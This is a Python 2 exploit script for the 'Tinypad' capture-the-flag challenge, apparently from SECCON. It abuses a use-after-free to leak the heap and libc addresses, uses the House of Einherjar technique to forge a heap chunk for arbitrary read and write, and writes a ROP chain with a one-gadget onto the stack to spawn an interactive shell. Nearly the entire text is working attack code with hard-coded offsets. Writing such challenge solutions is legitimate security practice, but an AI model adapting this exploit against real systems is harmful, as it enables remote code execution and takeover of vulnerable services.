#!/usr/bin/env python2

import hashlib
import re
import socket
import struct
import sys
import telnetlib


def p(x, t="<Q"): return struct.pack(t, x)
def u(x, t="<Q"): return struct.unpack(t, x)[0]
def unsigned(x): return u(p(x, t="<q"), t="<Q")

def read_until(f, delim='\n'):
    data = ""
    while not data.endswith(delim):
        data += f.read(1)
    return data

def connect(rhp):
    I("Connect to %s:%d"%(rhp))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
    s.connect(rhp)
    f = s.makefile('rw', bufsize=0)
    return s, f

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    I('4ll y0U n33D 15 5h3ll!!')
    t.interact()

def M(prefix, body):
    if len(body) == 1:
        body = ''.join(body)
    elif len(body) == 2:
        key, value = body
        if value <= 0xffffffff:
            value = '0x%08x'%(value)
        else:
            value = '0x%016x'%(value)
        body = '%s: %s'%(key, value)
    elif len(body) >= 3:
        body = '%s:%s'%(body[0], body[1:])

    text = '[{prefix}] {body}'.format(prefix=prefix, body=body)
    print text

def W(*body): M('!', body)
def N(*body): M('*', body)
def I(*body): M('+', body)
def RD(*body): M('D', repr(body))
def D(*body): M('D', body)

class IO(object):
    def __init__(self, rhp):
        self.rhp = rhp
        self.s, self.f = connect(self.rhp)

    def _read(self, size):
        return self.s.recv(size)

    def _write(self, buf):
        self.s.send(buf)

    def write(self, buf, end=''):
        self._write(buf+end)

    def writeln(self, buf):
        self.write(buf, end='\n')

    def read_until(self, delim='\n'):
        buf = ''
        while not buf.endswith(delim):
            buf += self._read(1)
        return buf

    def flush(self):
        self.f.flush()

    def close(self):
        self.f.close()
        self.s.close()

    def interact(self):
        interact(self.s)

### user-defined
class TinyPadIO(IO):

    def __init__(self, rhp):
        super(TinyPadIO, self).__init__(rhp)
        #self.writeln('dukucy!!') #, for testing.
        self.read_until('(CMD)>>> ')

    def add(self, size, content):
        self.writeln('A')
        self.read_until('(SIZE)>>> ')
        self.writeln(str(size))
        self.read_until('(CONTENT)>>> ')
        self.writeln(content)
        self.read_until('(CMD)>>> ')

    def edit(self, index, content):
        self.writeln('E')
        self.read_until('(INDEX)>>> ')
        self.writeln(str(index))
        self.read_until('(CONTENT)>>> ')
        self.writeln(content)
        self.writeln('Y')
        self.read_until('(CMD)>>> ')

    def delete(self, index):
        self.writeln('D')
        self.read_until('(INDEX)>>> ')
        self.writeln(str(index))
        self.read_until('(CMD)>>> ')

    def quit(self):
        self.writeln('Q')


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print >> sys.stderr, "Usage: %s HOST PORT"%(sys.argv[0])
        print >> sys.stderr, "Tinypad is running on tinypad.pwn.seccon.jp:57463."
        sys.exit(0)

    host, port = sys.argv[1:]
    rhp = (host, int(port))
    tpio = TinyPadIO(rhp)

    # -- useful offsets
    offset_main_arena_58h = 0x3be760 + 0x58
    ''' {{{ 
    gdf>  p/x (void *)&main_arena-(void *)
    $5 = 0x3be760
    }}} '''

    offset_libc___libc_system = 0x46590
    ''' {{{ 
    gef>  p/x (void *)&__libc_system-(void *)$libc_base
    $4 = 0x46590
    }}} '''

    offset_libc___libc_argv = 0x3c3be0
    ''' {{{ 
    gef>  p/x (void *)&__libc_argv-(void *)$libc_base
    $3 = 0x3c3be0
    }}} '''
    offset_libc_binsh = 0x17c8c0 + 3
    ''' {{{
    17c8c0 2d63002f 62696e2f 73680065 78697420  -c./bin/sh.exit
    }}} '''

    ## calculate with a debugger.
    offset_einherjar = 0x20
    offset_rop1 = 0xe0
    offset_rop2 = 0xb0
    offset_binsh = 0xc0

    offset_onegadget_rce = 0x6fbda
    ''' {{{ 
    6fbda:       48 8d 3d e2 cc 10 00    lea    0x10cce2(%rip),%rdi        # 17c8c3 <_libc_intl_domainname@@GLIBC_2.2.5+0x242>
    6fbe1:       48 8d 15 d8 cc 10 00    lea    0x10ccd8(%rip),%rdx        # 17c8c0 <_libc_intl_domainname@@GLIBC_2.2.5+0x23f>
    6fbe8:       48 8d 35 d9 cc 10 00    lea    0x10ccd9(%rip),%rsi        # 17c8c8 <_libc_intl_domainname@@GLIBC_2.2.5+0x247>
    6fbef:       45 31 c0                xor    %r8d,%r8d
    6fbf2:       4c 89 f1                mov    %r14,%rcx
    6fbf5:       31 c0                   xor    %eax,%eax
    6fbf7:       e8 a4 18 05 00          callq  c14a0 <execl@@GLIBC_2.2.5>
    }}} '''

    addr_gadget = 0x4013cb
    ''' {{{ 
    4013cb:	5d                   	pop    %rbp
    4013cc:	41 5c                	pop    %r12
    4013ce:	41 5d                	pop    %r13
    4013d0:	41 5e                	pop    %r14
    4013d2:	41 5f                	pop    %r15
    4013d4:	c3                   	retq   
    }}} '''
    addr_tinypad = 0x602040
    addr_sh = addr_tinypad + 0x100 - 0x20

    # -- begin exploit.
    # This exploit works on Ubuntu 14.04 (Trusty64).

    ## 1. leak heap base, link fastbin-sized chunk to the specified free list.
    tpio.add(0x78, 'A'*0x8)
    tpio.add(0x78, 'B'*0x8)
    tpio.add(0x100, 'C'*0x8)
    tpio.delete(2)
    tpio.delete(1)

    ### UAF
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 1\n # CONTENT: (.+)', data)
    if result:
        heap_base = u(result[0].ljust(8, '\0')) - 0x80
    if not heap_base:
        W('Couldn\'t get the heap base...')
        tpio.close()
        sys.exit(-1)
    I('heap base: '+hex(heap_base))

    ## 2. leak libc addr and calculate some addresses.

    ### put free()'d chunks to unsorted_chunks by malloc_consolidate().
    tpio.delete(3)

    ### UAF
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 1\n # CONTENT: (.+)', data)
    if result:
        libc_base = u(result[0].ljust(8, '\0')) - offset_main_arena_58h 
        libc_base = u(result[0].ljust(8, '\0')) - 0x3c4b78
    I('libc base: '+hex(libc_base))

    ### calculate some stuffs.
    addr_libc___libc_system = libc_base + offset_libc___libc_system
    addr_libc___libc_argv = libc_base + offset_libc___libc_argv
    addr_onegadet_rce = libc_base + offset_onegadget_rce

    ## 3. make a condition of House of Einherjar
    tpio.add(0x18, 'EINHERJAR#'.ljust(0x18, 'A'))
    tpio.add(0x100, 'B'*0xf8+'\x11')
    tpio.add(0x100, 'C'*0xf8)
    addr_einherjar = heap_base + offset_einherjar
    N('addr_einherjar: 0x%08x'%(addr_einherjar))

    ### forge a fake chunk nearby tinypad#page
    addr_fakechunk, fakechunk_size = addr_tinypad + 0xd0, 0x101
    diff = unsigned(addr_einherjar - addr_fakechunk) 
    fakechunk = ''.join((
        p(fakechunk_size).rjust(0x8, 'P'),
        p(addr_fakechunk), p(addr_fakechunk), 
        )).rjust(0xf0, 'P')
    tpio.edit(3, fakechunk)
    
    ### get a diff between the target chunk and the fake chunk
    diff = unsigned(addr_einherjar - addr_fakechunk) 
    N('addr_fakechunk - addr_einherjar: 0x%08x'%(diff))

    ### unset PREV_INUSE
    data = '\x01'.rjust(0x18+2, 'P')
    tpio.edit(1, data)

    ### '\0' padding
    w = p(diff).strip('\0')
    if len(w) != 3:
        W('Too many NUL bytes in the diff.')
        tpio.close()
        sys.exit(-1)
    number_of_zeros = len(p(diff))-len(w)
    for i in range(number_of_zeros+1):
        data = w.rjust(0x18-i, 'P')
        tpio.edit(1, data)

    ### trigger House of Einherjar.
    tpio.delete(2)
    for i in range(len(w)-1):
        tpio.edit(3, '\x01\x01'.rjust(0xd8+len(w)-i))

    ## 4. get both arbitrary read and write. 

    ### malloc() the forged chunk and put some fake tinypad#page.
    fake_pads = ''.join((
        'sh\0'.ljust(0x20, 'P'),
        'P'*0x8, p(addr_tinypad+0x100),
        ### addr_tinypad+0x100+0x28 is the same as &tinypad[2].pad
        'P'*0x8, p(addr_tinypad+0x100+0x28),
        'P'*0x8, p(addr_libc___libc_argv),
        ### get a stack address
        'P'*0x8, p(addr_libc___libc_argv), 
        ))
    tpio.add(0x100-8, fake_pads)

    ## 5. construct a rop chain. 

    ### leak a stack address,
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 4\n # CONTENT: (.+)', data)
    if result:
        addr_stack_argv = u(result[0][-6:].ljust(8, '\0'))
    N('addr_stack_argv: '+hex(addr_stack_argv))

    # and calculate some useful addresses.
    addr_stack_rop1 = addr_stack_argv - offset_rop1
    addr_stack_rop2 = addr_stack_argv - offset_rop2
    addr_stack_binsh = addr_stack_argv - offset_binsh
    N('return address is at '+hex(addr_stack_rop1))

    ### put "/bin/sh" on the specified memory as the parameter for /bin/sh.
    w = p(addr_sh).strip('\0')
    number_of_zeros = len(p(addr_sh)) - len(w)
    tpio.edit(2, p(addr_stack_binsh))
    for i in range(number_of_zeros+1):
        tpio.edit(3, 'A'*(8-i))
    tpio.edit(3, p(addr_sh))

    ### put the rop1
    w = p(addr_gadget).strip('\0')
    number_of_zeros = len(p(addr_gadget)) - len(w)
    tpio.edit(2, p(addr_stack_rop1))
    for i in range(number_of_zeros+1):
        tpio.edit(3, 'A'*(8-i))
    tpio.edit(3, p(addr_gadget))

    ### put the rop2
    tpio.edit(2, p(addr_stack_rop2))
    tpio.edit(3, 'A'*(7))
    tpio.edit(3, p(addr_onegadet_rce))

    ## 6. quit to get a shell, enjoy!
    tpio.quit()
    tpio.interact()
